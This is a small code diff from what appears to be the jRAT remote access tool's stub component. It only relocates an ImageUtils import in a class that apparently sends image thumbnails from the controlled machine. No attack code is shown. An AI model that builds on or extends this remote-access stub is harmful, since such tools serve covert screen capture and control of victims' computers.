@@ -7,8 +7,8 @@ import java.awt.image.DataBufferByte;
 import java.io.DataOutputStream;
 
 import se.jrat.common.io.StringWriter;
+import se.jrat.common.utils.ImageUtils;
 import se.jrat.stub.Main;
-import se.jrat.stub.utils.ImageUtils;
 
 public class Packet33Thumbnail extends AbstractOutgoingPacket {
 
